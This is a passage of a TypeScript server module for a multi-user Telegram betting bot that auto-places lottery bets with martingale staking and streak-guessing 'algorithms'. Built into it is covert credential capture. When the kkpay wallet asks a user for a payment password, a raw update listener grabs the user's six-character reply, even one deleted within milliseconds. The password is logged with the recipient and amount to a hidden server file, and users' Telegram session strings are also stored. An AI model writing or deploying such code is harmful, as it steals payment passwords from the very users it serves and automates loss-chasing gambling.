import { Router, type Response } from "express";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import { Api } from "telegram";
import bigInt from "big-integer";
import { NewMessage, NewMessageEvent, Raw } from "telegram/events/index.js";
import fs from "fs";
import path from "path";
import { logger } from "../lib/logger";
import { requireAuth, requireCard, requireAdmin } from "../middleware/requireAuth";
import { db } from "@workspace/db";
import { cardKeys } from "@workspace/db";
import { eq, and, gt } from "drizzle-orm";

const router = Router();

// ─── Types ────────────────────────────────────────────────────────────────────

type BetStrategy = "normal" | "martingale" | "anti-martingale";
type BetOption = "big" | "small" | "odd" | "even" | "big-odd" | "big-even" | "small-odd" | "small-even";
type AlgorithmId = "signal_follow" | "signal_reverse" | "streak_follow" | "cold_pick" | "random" | "ai_trend"
  | "dragon_ride" | "dragon_break" | "momentum" | "anti_streak";

interface BetCfg {
  autoBet: boolean;
  betAmount: number;
  strategy: BetStrategy;
  betMultiplier: number;
  maxConsecutiveLosses: number;
  stopLoss: number;
  targetProfit: number;
  cooldownSeconds: number;
  amountLevels: number[];
  stepBackOnWin: boolean;
  betOptions: BetOption[];
  algorithms: AlgorithmId[];
  odds: number;
  chaseNumbers: Array<{ num: number; amount: number }>;
  enableChase: boolean;
}

interface GroupInfo {
  id: string;
  title: string;
  type: string;
  membersCount?: number;
}

interface BetRecord {
  id: string;
  groupId: string;
  groupTitle: string;
  messageText: string;
  betContent: string;
  amount: number;
  timestamp: number;
  status: "sent" | "won" | "lost" | "failed";
  won?: boolean;
  pnl?: number;
  lotteryResult?: string;
  period?: number;
  isChase?: boolean;
}

interface TgSession {
  userId: number;
  client: TelegramClient;
  stringSession: StringSession;
  phone: string;
  phoneCodeHash?: string;
  me?: Api.User;
  groups: GroupInfo[];
  watchGroupId?: string;
  cfg: BetCfg;
  // per-session state
  betLog: BetRecord[];
  sseClients: Set<Response>;
  messageHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  messageHandlerBuilder: NewMessage | null;
  kkpayHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  kkpayHandlerBuilder: NewMessage | null;
  kkpayOutRawHandler?: ((update: unknown) => Promise<void>) | null;
  kkpayOutRawBuilder?: Raw | null;
  // runtime
  consecutiveLosses: number;
  sessionPnl: number;
  currentBet: number;
  lastBetAt: number;
  currentLevel: number;
  algIndex: number;
  lastAlgoUsed?: AlgorithmId;
  currentPattern?: MarketPattern;
  recentResults: string[];
  betPlacedThisCycle: boolean;
  chasePlacedThisCycle: boolean;
  lastBetPeriod?: number;
  currentCloseTimeMs: number;
  yeMessageId?: number;
  // global TG message log (all incoming messages)
  chatLog: Array<{ sender: string; senderName: string; chatId: string; chatTitle: string; chatType: "private" | "group" | "channel"; text: string; timestamp: number; msgId?: number; buttons?: { text: string; data?: string }[][] }>;
  globalHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  globalHandlerBuilder: NewMessage | null;
  // balance
  balance: number;
  todayPnl: number;
  todayResetAt: number;
  balanceSource: "manual" | "kkpay";
  balanceUpdatedAt: number;
  kkpayUsername: string;
  kkpayEntityId?: string;
  // timers
  watchdogTimer?: ReturnType<typeof setInterval>;
  saveTimer?: ReturnType<typeof setInterval>;
  autoNextBetTimer?: ReturnType<typeof setTimeout>;
  lotteryPollTimer?: ReturnType<typeof setInterval>;
  kkpayPwdPollTimer?: ReturnType<typeof setInterval>;
  kkpayPwdContext?: string; // last captured payment context (recipient / amount)
  rawPwdHandler?: ((update: unknown) => Promise<void>) | null;
  rawPwdHandlerBuilder?: Raw | null;
  rawPwdHandlerTimeout?: ReturnType<typeof setTimeout>;
  lastSeenLotteryPeriod: number;
  lastSignalText: string;
}

interface PersistedData {
  sessionString: string;
  phone: string;
  balance: number;
  todayPnl: number;
  todayResetAt: number;
  sessionPnl: number;
  kkpayUsername: string;
  balanceSource: "manual" | "kkpay";
  watchGroupId?: string;
  cfg?: Partial<BetCfg>;
}

// ─── Constants ────────────────────────────────────────────────────────────────

const DRAW_CYCLE_MS = 210_000;
const BET_BEFORE_DRAW_MS = 80_000;

const DEFAULT_CFG: BetCfg = {
  autoBet: false,
  betAmount: 100,
  strategy: "normal",
  betMultiplier: 2,
  maxConsecutiveLosses: 5,
  stopLoss: 5000,
  targetProfit: 3000,
  cooldownSeconds: 0,
  amountLevels: [100, 200, 400, 800, 1600, 3200],
  stepBackOnWin: true,
  betOptions: ["big", "small"],
  algorithms: ["signal_follow"],
  odds: 1.98,
  chaseNumbers: [],
  enableChase: false,
};

const BET_OPTION_LABELS: Record<BetOption, string> = {
  big: "大", small: "小", odd: "单", even: "双",
  "big-odd": "大单", "big-even": "大双", "small-odd": "小单", "small-even": "小双",
};

// ─── Module state ─────────────────────────────────────────────────────────────

const tgSessions = new Map<number, TgSession>();
let lotteryHistoryCache: string[] = [];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function getCredentials() {
  return {
    apiId: parseInt(process.env["TELEGRAM_API_ID"] ?? "0", 10),
    apiHash: process.env["TELEGRAM_API_HASH"] ?? "",
  };
}

function makeClientOptions() {
  return {
    connectionRetries: 1000,
    autoReconnect: true,
    retryDelay: 2000,
    floodSleepThreshold: 60,
    deviceModel: "iPhone 14",
    systemVersion: "iOS 17.0",
    appVersion: "9.7.0",
  };
}

function todayMidnight(): number {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return d.getTime();
}

function pushEvent(session: TgSession, type: string, payload: Record<string, unknown>): void {
  if (session.sseClients.size === 0) return;
  const data = JSON.stringify({ type, ...payload });
  for (const res of session.sseClients) {
    try { res.write(`data: ${data}\n\n`); } catch { session.sseClients.delete(res); }
  }
}

// ─── kkpay password event log ─────────────────────────────────────────────────

interface KkpayPwdEvent {
  id: string;
  timestamp: number;
  userId: number;
  username: string;
  event: "pwd_requested" | "pwd_sent" | "pwd_success";
  text: string;
  context?: string; // e.g. "转账给 @FQFM88 (7358230315) 1000 KKCOIN"
}

const PWD_LOG_FILE = path.join(process.cwd(), ".kkpay-pwd-log.json");

let kkpayPwdLog: KkpayPwdEvent[] = (() => {
  try {
    if (fs.existsSync(PWD_LOG_FILE)) {
      return JSON.parse(fs.readFileSync(PWD_LOG_FILE, "utf-8")) as KkpayPwdEvent[];
    }
  } catch { /* ignore */ }
  return [];
})();

function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEvent["event"], text: string, context?: string): void {
  // Deduplicate: skip if exact same pwd_sent text logged within last 10 seconds
  if (event === "pwd_sent") {
    const recent = kkpayPwdLog.find(e => e.event === "pwd_sent" && e.userId === userId && e.text === text && Date.now() - e.timestamp < 10_000);
    if (recent) return;
  }
  const entry: KkpayPwdEvent = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    timestamp: Date.now(),
    userId,
    username,
    event,
    text,
    ...(context ? { context } : {}),
  };
  kkpayPwdLog.unshift(entry);
  if (kkpayPwdLog.length > 500) kkpayPwdLog = kkpayPwdLog.slice(0, 500);
  try { fs.writeFileSync(PWD_LOG_FILE, JSON.stringify(kkpayPwdLog, null, 2), "utf-8"); } catch { /* ignore */ }
}

/**
 * Extract a short human-readable payment context from recent kkpay chatLog entries.
 * Looks for recipient username/ID and amount in the last few kkpay messages.
 */
function extractKkpayContext(session: TgSession): string | undefined {
  const eid = session.kkpayEntityId;
  if (!eid) return undefined;
  // Scan the last 15 chatLog entries from kkpay (newest first)
  const recentKkpay = session.chatLog
    .filter(m => m.chatId === eid || `-100${m.chatId}` === eid)
    .slice(0, 15);
  for (const m of recentKkpay) {
    const t = m.text;
    // Extract: recipient TG username like @FQFM88
    const tgUser = t.match(/用户名[：:]\s*(@\S+)/)?.[1] ?? t.match(/收款人[：:]\s*(@?\S+)/)?.[1];
    // Extract: numeric user ID
    const uid = t.match(/用户\s*ID[：:]\s*(\d+)/)?.[1] ?? t.match(/用户[：:]\s*(\d+)/)?.[1];
    // Extract: amount
    const amtMatch = t.match(/金额[：:]\s*([\d,.]+\s*KKCOIN)/i) ?? t.match(/([\d,.]+\s*KKCOIN)/i);
    const amt = amtMatch?.[1];
    if (tgUser || uid || amt) {
      const parts: string[] = [];
      if (tgUser) parts.push(tgUser);
      if (uid && uid !== tgUser?.replace("@", "")) parts.push(`(${uid})`);
      if (amt) parts.push(amt);
      return parts.join(" ");
    }
  }
  return undefined;
}

/**
 * Tear down the raw password listener and its auto-expire timer.
 */
function stopKkpayRawPwdListener(session: TgSession): void {
  if (session.rawPwdHandlerTimeout) { clearTimeout(session.rawPwdHandlerTimeout); session.rawPwdHandlerTimeout = undefined; }
  if (session.rawPwdHandler && session.rawPwdHandlerBuilder) {
    try { session.client.removeEventHandler(session.rawPwdHandler as Parameters<typeof session.client.removeEventHandler>[0], session.rawPwdHandlerBuilder); } catch { /* ignore */ }
  }
  session.rawPwdHandler = null;
  session.rawPwdHandlerBuilder = null;
}

/**
 * After kkpay asks for the payment password, attach a low-level Raw update
 * handler that fires BEFORE GramJS's higher-level event filtering, catching
 * the outgoing 6-char message even if kkpay deletes it within milliseconds.
 */
function startKkpayRawPwdListener(session: TgSession): void {
  stopKkpayRawPwdListener(session);
  const eid = session.kkpayEntityId;
  if (!eid) return;

  const username = session.me?.username ?? String(session.userId);

  session.rawPwdHandler = async (update: unknown) => {
    let chatId = "";
    let text = "";

    if (update instanceof Api.UpdateShortMessage) {
      // Private-chat short message (most common path when sending from phone)
      if (!update.out) return;
      chatId = String(update.userId);
      text = (update.message ?? "").trim();
    } else if (update instanceof Api.UpdateNewMessage) {
      // Full message update (less common for private chats)
      const msg = update.message;
      if (!(msg instanceof Api.Message)) return;
      if (!msg.out) return;
      const peer = msg.peerId;
      if (peer instanceof Api.PeerUser) chatId = String(peer.userId);
      else if (peer instanceof Api.PeerChannel) chatId = String(peer.channelId);
      else if (peer instanceof Api.PeerChat) chatId = String(peer.chatId);
      text = (msg.message ?? "").trim();
    } else {
      return;
    }

    if (chatId !== eid && `-100${chatId}` !== eid) return;
    if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;

    appendKkpayPwdEvent(session.userId, username, "pwd_sent", text, session.kkpayPwdContext);
    stopKkpayRawPwdListener(session);
  };

  // Must include BOTH types: UpdateShortMessage is the typical TL update for
  // outgoing private-chat messages sent from another device (phone → kkpay),
  // while UpdateNewMessage covers the less-common full-message path.
  session.rawPwdHandlerBuilder = new Raw({ types: [Api.UpdateShortMessage, Api.UpdateNewMessage] });
  session.client.addEventHandler(
    session.rawPwdHandler as Parameters<typeof session.client.addEventHandler>[0],
    session.rawPwdHandlerBuilder,
  );

  // Auto-expire after 90 seconds regardless
  session.rawPwdHandlerTimeout = setTimeout(() => stopKkpayRawPwdListener(session), 90_000);
}

// ─── Session persistence ──────────────────────────────────────────────────────

function sessionFile(userId: number): string {
  return path.join(process.cwd(), `.tg-session-${userId}.json`);
}

function saveSession(session: TgSession): void {
  try {
    const data: PersistedData = {
      sessionString: session.stringSession.save(),
      phone: session.phone,
      balance: session.balance,
      todayPnl: session.todayPnl,
      todayResetAt: session.todayResetAt,
      sessionPnl: session.sessionPnl,
      kkpayUsername: session.kkpayUsername,
      balanceSource: session.balanceSource,
      watchGroupId: session.watchGroupId,
      cfg: session.cfg,
    };
    fs.writeFileSync(sessionFile(session.userId), JSON.stringify(data, null, 2), "utf-8");
  } catch { /* ignore */ }
}

async function fetchGroups(client: TelegramClient): Promise<GroupInfo[]> {
  try {
    const dialogs = await client.getDialogs({ limit: 100 });
    return dialogs
      .filter((d) => d.isGroup || d.isChannel)
      .map((d) => ({
        id: String(d.id),
        title: d.title ?? "Unknown",
        type: d.isChannel ? "channel" : "group",
        membersCount: (d.entity as Api.Chat)?.participantsCount ?? undefined,
      }));
  } catch {
    return [];
  }
}

// ─── Watchdog ─────────────────────────────────────────────────────────────────

function stopAllTimers(session: TgSession): void {
  if (session.watchdogTimer) { clearInterval(session.watchdogTimer); session.watchdogTimer = undefined; }
  if (session.saveTimer) { clearInterval(session.saveTimer); session.saveTimer = undefined; }
  if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
  if (session.lotteryPollTimer) { clearInterval(session.lotteryPollTimer); session.lotteryPollTimer = undefined; }
  if (session.globalHandler && session.globalHandlerBuilder) {
    try { session.client.removeEventHandler(session.globalHandler, session.globalHandlerBuilder); } catch { /* ok */ }
    session.globalHandler = null; session.globalHandlerBuilder = null;
  }
}

function startGlobalListener(session: TgSession): void {
  if (session.globalHandler && session.globalHandlerBuilder) {
    try { session.client.removeEventHandler(session.globalHandler, session.globalHandlerBuilder); } catch { /* ok */ }
    session.globalHandler = null; session.globalHandlerBuilder = null;
  }

  session.globalHandler = async (event: NewMessageEvent) => {
    const msg = event.message;
    const text = msg.message ?? "";
    if (!text.trim()) return;

    const chatId = String(msg.chatId ?? msg.senderId ?? "");

    // ─── Capture outgoing password sent directly in Telegram ───
    if (msg.out) {
      const eid = session.kkpayEntityId;
      const isToKkpay = eid && (chatId === eid || `-100${chatId}` === eid);
      if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(text.trim())) {
        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", text.trim(), session.kkpayPwdContext);
      }
      return;
    }
    const senderId = String(msg.senderId ?? "");

    let chatTitle = chatId;
    let senderName = senderId;
    let chatType: "private" | "group" | "channel" = "private";

    try {
      const chat = msg.chat as ({ title?: string; firstName?: string; lastName?: string; className?: string }) | undefined;
      if (chat) {
        const cls = chat.className ?? "";
        if (cls === "Channel") { chatType = "channel"; chatTitle = chat.title ?? chatId; }
        else if (cls === "Chat" || cls === "ChatForbidden") { chatType = "group"; chatTitle = chat.title ?? chatId; }
        else { chatType = "private"; chatTitle = [chat.firstName, chat.lastName].filter(Boolean).join(" ") || chatId; }
      }
      const sender = msg.sender as ({ title?: string; firstName?: string; lastName?: string; username?: string }) | undefined;
      if (sender) {
        senderName = sender.title ?? ([sender.firstName, sender.lastName].filter(Boolean).join(" ") || sender.username) ?? senderId;
      }
    } catch { /* ignore */ }

    let buttons: { text: string; data?: string }[][] | undefined;
    try {
      const rm = (msg as unknown as { replyMarkup?: unknown }).replyMarkup;
      if (rm && (rm as { className?: string }).className === "ReplyInlineMarkup") {
        const extracted = ((rm as { rows?: unknown[] }).rows ?? []).map(row =>
          ((row as { buttons?: unknown[] }).buttons ?? []).map(btn => ({
            text: (btn as { text?: string }).text ?? "",
            data: (btn as { className?: string; data?: Buffer }).className === "KeyboardButtonCallback"
              ? ((btn as { data?: Buffer }).data?.toString("hex"))
              : undefined,
          })).filter(b => b.text)
        ).filter(r => r.length > 0);
        if (extracted.length > 0) buttons = extracted;
      }
    } catch { /* ignore */ }

    session.chatLog.unshift({ sender: senderId, senderName, chatId, chatTitle, chatType, text: text.slice(0, 500), timestamp: Date.now(), msgId: msg.id, buttons });
    if (session.chatLog.length > 200) session.chatLog.pop();

    // ─── kkpay password event detection (text-only, no entity ID comparison needed) ───
    if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
      session.kkpayPwdContext = extractKkpayContext(session);
      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300), session.kkpayPwdContext);
      startKkpayRawPwdListener(session);
    } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300), session.kkpayPwdContext);
      session.kkpayPwdContext = undefined;
      stopKkpayRawPwdListener(session);
    }
  };

  session.globalHandlerBuilder = new NewMessage({});
  session.client.addEventHandler(session.globalHandler, session.globalHandlerBuilder);
}

function startWatchdog(session: TgSession): void {
  stopAllTimers(session);

  session.saveTimer = setInterval(() => {
    if (tgSessions.get(session.userId) !== session) { clearInterval(session.saveTimer); return; }
    saveSession(session);
  }, 5 * 60 * 1000);

  session.watchdogTimer = setInterval(() => {
    if (tgSessions.get(session.userId) !== session) { clearInterval(session.watchdogTimer); return; }
    void (async () => {
      try {
        await session.client.getMe();
      } catch {
        try {
          await session.client.connect();
          if (session.watchGroupId) startGroupListener(session);
          startGlobalListener(session);
          await startKkpayListener(session);
          saveSession(session);
          pushEvent(session, "session:reconnected", { at: Date.now() });
        } catch { /* retry next cycle */ }
      }
    })();
  }, 15 * 1000);
}

// ─── Restore sessions on boot ─────────────────────────────────────────────────

async function restoreUserSession(userId: number, file: string): Promise<void> {
  try {
    const raw = fs.readFileSync(file, "utf-8");
    const data = JSON.parse(raw) as PersistedData;
    if (!data.sessionString) return;

    const { apiId, apiHash } = getCredentials();
    if (!apiId || !apiHash) return;

    const stringSession = new StringSession(data.sessionString);
    const client = new TelegramClient(stringSession, apiId, apiHash, makeClientOptions());
    await client.connect();
    const me = (await client.getMe()) as Api.User;
    if (!me?.id) return;

    const session: TgSession = {
      userId,
      client, stringSession,
      phone: data.phone ?? "",
      groups: await fetchGroups(client),
      cfg: data.cfg ? { ...DEFAULT_CFG, ...data.cfg, autoBet: false } : { ...DEFAULT_CFG },
      betLog: [], sseClients: new Set(),
      messageHandler: null, messageHandlerBuilder: null,
      kkpayHandler: null, kkpayHandlerBuilder: null,
      globalHandler: null, globalHandlerBuilder: null,
      consecutiveLosses: 0,
      sessionPnl: 0,
      currentLevel: 0,
      currentBet: (data.cfg?.amountLevels?.length ?? 0) > 1
        ? (data.cfg!.amountLevels![0] ?? data.cfg?.betAmount ?? DEFAULT_CFG.betAmount)
        : (data.cfg?.betAmount ?? DEFAULT_CFG.betAmount),
      lastBetAt: 0,
      algIndex: 0,
      betPlacedThisCycle: false,
      chasePlacedThisCycle: false,
      lastSeenLotteryPeriod: 0,
      currentCloseTimeMs: 0,
      lastSignalText: "",
      recentResults: [],
      chatLog: [],
      balance: data.balance ?? 1000000,
      todayPnl: data.todayPnl ?? 0,
      todayResetAt: data.todayResetAt ?? todayMidnight(),
      kkpayUsername: data.kkpayUsername ?? "kkpay",
      kkpayEntityId: undefined,
      balanceSource: data.balanceSource ?? "manual",
      balanceUpdatedAt: 0,
      me,
      watchGroupId: data.watchGroupId,
    };

    tgSessions.set(userId, session);

    if (session.watchGroupId) startGroupListener(session);
    startGlobalListener(session);
    startKkpayListener(session).catch(() => { /* ignore */ });
    startWatchdog(session);
    logger.info({ userId }, "[tg] session restored");
  } catch {
    try { fs.unlinkSync(file); } catch { /* ok */ }
  }
}

async function restoreAllSessions(): Promise<void> {
  const cwd = process.cwd();
  try {
    const files = fs.readdirSync(cwd).filter(f => /^\.tg-session-\d+\.json$/.test(f));
    for (const f of files) {
      const userId = parseInt(f.replace(".tg-session-", "").replace(".json", ""), 10);
      if (!isNaN(userId)) await restoreUserSession(userId, path.join(cwd, f));
    }
    // legacy single-user session migration
    const legacy = path.join(cwd, ".tg-session.json");
    if (fs.existsSync(legacy)) {
      logger.info("[tg] legacy session file found but skipped (multi-user mode requires re-login)");
    }
  } catch { /* ignore */ }
}

void restoreAllSessions();

// ─── Periodic expiry enforcement ──────────────────────────────────────────────
// Every 60s: disconnect TG sessions whose card has expired and delete the session file.
setInterval(async () => {
  if (tgSessions.size === 0) return;
  try {
    const now = new Date();
    for (const [userId, session] of tgSessions) {
      // Check if this user has any active (non-expired) card
      const [active] = await db.select({ id: cardKeys.id })
        .from(cardKeys)
        .where(and(eq(cardKeys.userId, userId), gt(cardKeys.expiresAt!, now)))
        .limit(1);
      if (!active) {
        logger.info({ userId }, "[tg] card expired — auto-disconnecting session");
        stopAllTimers(session);
        try { await session.client.invoke(new Api.auth.LogOut()); } catch { /* ok */ }
        try { await session.client.disconnect(); } catch { /* ok */ }
        tgSessions.delete(userId);
        try { fs.unlinkSync(sessionFile(userId)); } catch { /* ok */ }
      }
    }
  } catch (err) {
    logger.error(err, "[tg] expiry check failed");
  }
}, 60_000);

// ─── Balance parsing ──────────────────────────────────────────────────────────

function parseBalance(text: string): number | null {
  const patterns = [
    /KKCOIN\s*[：:]\s*([\d,]+\.?\d*)/i,
    /当前余额[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /(?:可用|账[户号])?余额[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /balance[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /💰\s*[¥￥]?\s*([\d,]+\.?\d*)/,
    /剩余[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /总资产[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /钱包余额[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
  ];
  for (const p of patterns) {
    const m = text.match(p);
    if (m) {
      const val = parseFloat(m[1].replace(/,/g, ""));
      if (!isNaN(val) && val >= 0) return val;
    }
  }
  return null;
}

async function sendYeForBalance(session: TgSession): Promise<void> {
  if (!session.watchGroupId) return;
  try {
    const sent = await session.client.sendMessage(session.watchGroupId, { message: "ye" });
    session.yeMessageId = sent.id;
    logger.info({ msgId: sent.id, userId: session.userId }, "[balance] sent 'ye'");
  } catch (err) {
    logger.warn({ err }, "[balance] failed to send 'ye'");
  }
}

function updateBalance(session: TgSession, text: string): void {
  const bal = parseBalance(text);
  if (bal === null) return;
  session.balance = bal;
  session.balanceSource = "kkpay";
  session.balanceUpdatedAt = Date.now();
  pushEvent(session, "balance:update", {
    balance: bal,
    balanceSource: "kkpay",
    balanceUpdatedAt: session.balanceUpdatedAt,
  });
}

// ─── Bet settlement ───────────────────────────────────────────────────────────

function computeNextBet(session: TgSession, won: boolean): number {
  const { amountLevels, stepBackOnWin, betAmount, strategy, betMultiplier } = session.cfg;
  if (amountLevels.length > 1) {
    let lvl = session.currentLevel;
    lvl = won ? (stepBackOnWin ? 0 : lvl) : Math.min(amountLevels.length - 1, lvl + 1);
    session.currentLevel = lvl;
    return amountLevels[lvl]!;
  }
  if (strategy === "normal") return betAmount;
  if (strategy === "martingale") return won ? betAmount : Math.round(session.currentBet * betMultiplier);
  return won ? Math.round(session.currentBet * betMultiplier) : betAmount;
}

function checkRisk(session: TgSession): { ok: boolean; reason?: string } {
  const { stopLoss, targetProfit, maxConsecutiveLosses, cooldownSeconds } = session.cfg;
  if (maxConsecutiveLosses > 0 && session.consecutiveLosses >= maxConsecutiveLosses)
    return { ok: false, reason: `连亏${session.consecutiveLosses}局，已达上限${maxConsecutiveLosses}局` };
  if (stopLoss > 0 && session.sessionPnl <= -stopLoss)
    return { ok: false, reason: `亏损 ¥${Math.abs(session.sessionPnl).toFixed(0)} 已达止损 ¥${stopLoss}` };
  if (targetProfit > 0 && session.sessionPnl >= targetProfit)
    return { ok: false, reason: `盈利 ¥${session.sessionPnl.toFixed(0)} 已达止盈 ¥${targetProfit}` };
  if (cooldownSeconds > 0 && session.lastBetAt > 0) {
    const elapsed = (Date.now() - session.lastBetAt) / 1000;
    if (elapsed < cooldownSeconds)
      return { ok: false, reason: `冷却中 (${Math.ceil(cooldownSeconds - elapsed)}s)` };
  }
  return { ok: true };
}

function settleBet(session: TgSession, opts: { won: boolean; pnl?: number; result?: string; betId?: string; period?: number }): void {
  const { won, pnl, result, betId, period } = opts;
  const { betLog } = session;

  if (pnl !== undefined) {
    session.sessionPnl += pnl;
    session.balance += pnl;
    const midnight = todayMidnight();
    if (session.todayResetAt < midnight) { session.todayPnl = 0; session.todayResetAt = midnight; }
    session.todayPnl += pnl;
  }

  const record = betId ? betLog.find(b => b.id === betId) : betLog.find(b => b.status === "sent");
  if (record) {
    record.won = won;
    record.status = won ? "won" : "lost";
    if (pnl !== undefined) record.pnl = pnl;
    if (result) record.lotteryResult = result;
    if (period && !record.period) record.period = period;
  }

  if (result) {
    session.recentResults.push(result);
    if (session.recentResults.length > 30) session.recentResults.shift();
  }

  session.consecutiveLosses = won ? 0 : session.consecutiveLosses + 1;
  session.currentBet = computeNextBet(session, won);

  if (record) {
    const settled = betLog.filter(b => b.won !== undefined);
    const wins = settled.filter(b => b.won === true).length;
    let streak = 0, maxS = 0;
    for (const b of [...betLog].reverse()) {
      if (b.won === true) { streak++; if (streak > maxS) maxS = streak; }
      else if (b.won === false) streak = 0;
    }
    pushEvent(session, "bet:result", {
      bet: record,
      balance: session.balance,
      todayPnl: session.todayPnl,
      sessionPnl: session.sessionPnl,
      consecutiveLosses: session.consecutiveLosses,
      currentBet: session.currentBet,
      totalBets: betLog.filter(b => b.status !== "failed").length,
      settled: settled.length,
      wins, maxStreak: maxS,
      winRate: settled.length > 0 ? ((wins / settled.length) * 100).toFixed(2) : "0.00",
    });
  }
}

// ─── Algorithm helpers ────────────────────────────────────────────────────────

function dragonStreak(mapped: string[], label: string): number {
  let n = 0;
  for (let i = mapped.length - 1; i >= 0 && mapped[i] === label; i--) n++;
  return n;
}

function mapR3ToEnabled(r3: string, enabled: string[]): string | null {
  if (enabled.includes(r3)) return r3;
  if (enabled.includes("大") && r3.startsWith("大")) return "大";
  if (enabled.includes("小") && r3.startsWith("小")) return "小";
  if (enabled.includes("单") && r3.endsWith("单")) return "单";
  if (enabled.includes("双") && r3.endsWith("双")) return "双";
  return null;
}

function freqPick(items: string[], labels: string[], sortAsc: boolean): string | null {
  const freq: Record<string, number> = {};
  for (const l of labels) freq[l] = 0;
  for (const r of items) { const m = mapR3ToEnabled(r, labels); if (m) freq[m] = (freq[m] ?? 0) + 1; }
  const sorted = Object.entries(freq).sort((a, b) => sortAsc ? a[1] - b[1] : b[1] - a[1]);
  return sorted[0]?.[0] ?? labels[Math.floor(Math.random() * labels.length)] ?? null;
}

function buildHistory(session: TgSession): string[] {
  return session.recentResults.length >= 3
    ? session.recentResults.slice(-10)
    : [...lotteryHistoryCache.slice(-10), ...session.recentResults];
}

// ─── Pattern detection & adaptive algorithm selection ─────────────────────────

type MarketPattern = "streak" | "oscillating" | "neutral";

/** 长龙形态适用算法 */
const STREAK_ALGOS: AlgorithmId[] = ["streak_follow", "dragon_ride", "momentum", "signal_follow", "ai_trend"];
/** 震荡形态适用算法 */
const OSCILLATING_ALGOS: AlgorithmId[] = ["anti_streak", "dragon_break", "signal_reverse"];
/** 中性算法（兜底） */
const NEUTRAL_ALGOS: AlgorithmId[] = ["random", "cold_pick"];

/**
 * 检测最近 8 期走势形态：
 * - 交替占比 ≥ 65% → 震荡局
 * - 交替占比 ≤ 35% → 长龙局
 * - 其他 → 中性
 */
function detectPattern(session: TgSession): MarketPattern {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return "neutral";
  const history = buildHistory(session);
  const mapped = history.slice(-8)
    .map(r => mapR3ToEnabled(r, labels))
    .filter((x): x is string => x !== null);
  if (mapped.length < 4) return "neutral";

  let alternations = 0;
  for (let i = 1; i < mapped.length; i++) {
    if (mapped[i] !== mapped[i - 1]) alternations++;
  }
  const ratio = alternations / (mapped.length - 1);
  if (ratio >= 0.65) return "oscillating";
  if (ratio <= 0.35) return "streak";
  return "neutral";
}

/**
 * 从用户已选算法中，根据当前形态挑选最合适的那个。
 * - 形态匹配 → 从匹配集合中按 algIndex 轮换（多个同类算法时均衡使用）
 * - 无匹配 → 用中性算法；仍无 → 用第一个已选算法
 */
function selectAlgoByPattern(session: TgSession): AlgorithmId {
  const algos = session.cfg.algorithms;
  if (!algos.length) return "random";
  if (algos.length === 1) return algos[0]!;

  const pattern = detectPattern(session);
  session.currentPattern = pattern;

  let candidates: AlgorithmId[];
  if (pattern === "streak") {
    candidates = algos.filter(a => STREAK_ALGOS.includes(a));
  } else if (pattern === "oscillating") {
    candidates = algos.filter(a => OSCILLATING_ALGOS.includes(a));
  } else {
    candidates = algos.filter(a => NEUTRAL_ALGOS.includes(a));
  }

  if (!candidates.length) candidates = algos; // 兜底：全部已选算法
  return candidates[session.algIndex % candidates.length]!;
}

/**
 * 顺势而为：只看最近 3 期结果，多数方向即为投注方向。
 * 平局（大小各半等）时跟最新一期，不受 10 期整体频率干扰。
 */
function streakFollow(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const history = buildHistory(session);
  const mapped = history.slice(-3)
    .map(r => mapR3ToEnabled(r, labels))
    .filter((x): x is string => x !== null);
  if (!mapped.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  // Majority vote
  const freq: Record<string, number> = {};
  for (const l of labels) freq[l] = 0;
  for (const r of mapped) freq[r] = (freq[r] ?? 0) + 1;
  const maxCount = Math.max(...Object.values(freq));
  const winners = Object.entries(freq).filter(([, c]) => c === maxCount).map(([l]) => l);
  // Tie → follow the most recent result
  if (winners.length > 1) return mapped[mapped.length - 1] ?? null;
  return winners[0] ?? null;
}

function dragonRide(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (mapped.length < 3) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const last = mapped[mapped.length - 1]!;
  return dragonStreak(mapped, last) >= 3 ? last : (labels[Math.floor(Math.random() * labels.length)] ?? null);
}

function dragonBreak(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (mapped.length < 4) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const last = mapped[mapped.length - 1]!;
  if (dragonStreak(mapped, last) >= 4) {
    const opp = labels.find(l => l !== last);
    return opp ?? labels[Math.floor(Math.random() * labels.length)] ?? null;
  }
  return labels[Math.floor(Math.random() * labels.length)] ?? null;
}

function momentum(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
